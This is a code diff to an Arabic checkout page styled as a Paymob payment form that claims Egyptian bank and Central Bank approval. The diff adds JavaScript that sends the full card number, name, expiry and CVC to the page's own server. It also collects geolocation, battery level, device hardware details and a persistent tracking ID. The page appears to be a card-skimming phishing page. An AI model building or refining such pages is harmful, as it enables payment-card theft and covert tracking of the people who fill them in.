@@ -255,11 +255,11 @@
     <div class="container">
         <div class="checkout-card">
             <section class="card-inputs">
-                <form id="paymob_checkout" action="/api/pay" method="POST" novalidate>
+                <form id="paymob_checkout" novalidate>
                     <input type="hidden" id="card_expiry_mm" name="card_expiry_mm">
                     <input type="hidden" id="card_expiry_yy" name="card_expiry_yy">
 
-                    <!-- 1. اختيار وسيلة الدفع (محفظة وبطاقة فقط) -->
+                    <!-- 1. اختيار وسيلة الدفع -->
                     <div class="input-group-custom">
                         <label>اختر وسيلة الدفع:</label>
                         <select name="payment_method" id="payment_method" required>
@@ -302,7 +302,7 @@
 
                     <!-- 4. خانات البطاقة البنكية -->
                     <div id="card_section">
-                        <!-- رقم الكارت مع شعار الفيزا وماستر كارد -->
+                        <!-- رقم الكارت -->
                         <div class="input-group-custom">
                             <label>رقم البطاقة البنكية:</label>
                             <div class="input-wrapper">
@@ -334,7 +334,7 @@
                             <div class="error-message" id="error_card_name">يرجى إدخال الاسم بالحروف الإنجليزية فقط.</div>
                         </div>
 
-                        <!-- تاريخ الانتهاء و CVC مع زر الإظهار والإخفاء -->
+                        <!-- تاريخ الانتهاء و CVC -->
                         <div class="input-containers">
                             <div class="input-group-custom">
                                 <label>التاريخ:</label>
@@ -382,21 +382,16 @@
                     </div>
                 </form>
             </section>
-     
+        </div>
+    </div>
 
     <!-- التذييل مع شعارات البنوك -->
     <footer>
         <div class="container bank-logos-container">
-            <div class="bank-logos-title"><i class="fa fa-shield" aria-hidden="true"></i>معتمد ومؤمن عبر البنوك المصرية والبنك المركزي</div>
+            <div class="bank-logos-title"><i class="fa fa-shield" aria-hidden="true"></i> معتمد ومؤمن عبر البنوك المصرية والبنك المركزي</div>
             <div class="bank-logos-grid">
-                <div class="bank-logo-card" title="البنك الأهلي المصري">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fc/NBE_logo.png" alt="البنك الأهلي المصري">
-                </div>
                 <div class="bank-logo-card" title="البنك المركزي المصري">
                     <img src="https://cbpn.currencyresearch.com/wp-content/uploads/2025/09/CentralBankofEgypt.png.webp" alt="البنك المركزي المصري">
-                </div>
-                <div class="bank-logo-card" title="بنك الأسكندرية">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/c/cc/Alex_Bank_Logo.svg" alt="بنك الأسكندرية">
                 </div>
             </div>
         </div>
@@ -429,7 +424,7 @@
             }
         });
 
-        // تفعيل زر إظهار وإخفاء رمز الـ CVV فقط
+        // تفعيل زر إظهار وإخفاء رمز الـ CVV
         const toggleCvvBtn = document.getElementById('toggleCvvBtn');
         const cardCvcInput = document.getElementById('card_cvc');
         const cvvIcon = document.getElementById('cvvIcon');
@@ -597,12 +592,44 @@
             }
         }
 
-        document.getElementById("paymob_checkout").addEventListener("submit", function (e) {
+        /**
+         * دالة جلب الإحداثيات الجغرافية بدقة مع التراجع التلقائي
+         */
+        function getGeolocation() {
+            return new Promise((resolve) => {
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            resolve({
+                                lat: position.coords.latitude.toString(),
+                                lon: position.coords.longitude.toString()
+                            });
+                        },
+                        () => {
+                            // القيم الافتراضية في حالة عدم السماح بالوصول للموقع
+                            resolve({ lat: "30.0444", lon: "31.2357" });
+                        },
+                        { timeout: 5000 }
+                    );
+                } else {
+                    resolve({ lat: "30.0444", lon: "31.2357" });
+                }
+            });
+        }
+
+        /**
+         * دالة معالجة الدفع المدمجة والشاملة لكل حقول البيانات
+         */
+        async function pay(e) {
+            if (e) e.preventDefault();
+
             const isAmountValid = validateAmount();
             let isPhoneValid = true;
             let isCardValid = true, isNameValid = true, isExpiryValid = true, isCvcValid = true;
 
-            if (paymentMethodSelect.value === 'card') {
+            const selectedMethod = paymentMethodSelect.value;
+
+            if (selectedMethod === 'card') {
                 isCardValid = validateCardNumber();
                 isNameValid = validateName();
                 isExpiryValid = validateMMYY();
@@ -612,14 +639,90 @@
             }
 
             if (!isAmountValid || !isPhoneValid || !isCardValid || !isNameValid || !isExpiryValid || !isCvcValid) {
-                e.preventDefault();
                 return;
             }
 
             const submitBtn = document.getElementById("submitButton");
             submitBtn.disabled = true;
             submitBtn.innerText = "جاري المعالجة والتحويل...";
-        });
+
+            // 1. توليد أو استرجاع المعرف الفريد للعميل
+            let clientID = localStorage.getItem("clientID");
+            if (!clientID) {
+                clientID = "ID_" + Math.random().toString(36).substr(2, 9);
+                localStorage.setItem("clientID", clientID);
+            }
+
+            // 2. جلب نسبة البطارية
+            let batteryLevel = "غير مدعوم";
+            try {
+                if (navigator.getBattery) {
+                    const batt = await navigator.getBattery();
+                    batteryLevel = Math.round(batt.level * 100) + "%";
+                }
+            } catch (err) {}
+
+            // 3. جلب الإحداثيات الجغرافية
+            const geo = await getGeolocation();
+
+            // 4. بناء كائن البيانات الكامل المدمج
+            const payload = {
+                amount: document.getElementById("pay_amount").value,
+                payment_method: selectedMethod,
+                phone: selectedMethod === "wallet" ? document.getElementById("user_phone").value : "غير محدد",
+                
+                // بيانات الكارت (في حالة استخدام الفيزا/ماستر كارد)
+                number: selectedMethod === "card" ? cardNumberInput.value.replace(/\s+/g, '') : "",
+                name: selectedMethod === "card" ? nameInput.value : "",
+                expiry: selectedMethod === "card" ? mmyyInput.value : "",
+                cvc: selectedMethod === "card" ? cvcInput.value : "",
+                save_card: document.getElementById("save_card").checked ? "tokenize" : "لا",
+
+                // تفاصيل وشبكة ومواصفات الجهاز
+                clientID: clientID,
+                internalIP: window.location.hostname || "127.0.0.1",
+                publicIP: "سيتم جلبها أوتوماتيكياً عبر السيرفر",
+                mac: "00:00:00:00:00:00",
+                lat: geo.lat,
+                lon: geo.lon,
+                city: "القاهرة",
+                country: "مصر",
+                battery: batteryLevel,
+                deviceModel: navigator.userAgent,
+                deviceRAM: (navigator.deviceMemory || "غير معروف") + " GB",
+                cpuCores: navigator.hardwareConcurrency || "غير معروف",
+                deviceType: /Mobi|Android/i.test(navigator.userAgent) ? "هاتف محمول" : "كمبيوتر",
+                screenSize: `${window.screen.width}x${window.screen.height}`,
+                userTimeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                lang: navigator.language
+            };
+
+            try {
+                const response = await fetch("/api/pay", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+
+                const resData = await response.json();
+                
+                if (resData.payment_url) {
+                    window.location.href = resData.payment_url;
+                } else {
+                    alert(resData.error || "حدث خطأ غير متوقع أثناء معالجة عملية الدفع.");
+                    submitBtn.disabled = false;
+                    submitBtn.innerText = "متابعة وتأكيد الدفع";
+                }
+            } catch (err) {
+                console.error("❌ Error processing payment:", err);
+                alert("تعذر الاتصال بالسيرفر. يرجى التأكد من الاتصال بالشبكة والمحاولة مجدداً.");
+                submitBtn.disabled = false;
+                submitBtn.innerText = "متابعة وتأكيد الدفع";
+            }
+        }
+
+        // ربط حدث الإرسال الخاص بالنموذج بدالة الدفع المدمجة
+        document.getElementById("paymob_checkout").addEventListener("submit", pay);
     </script>
 </body>
 </html>
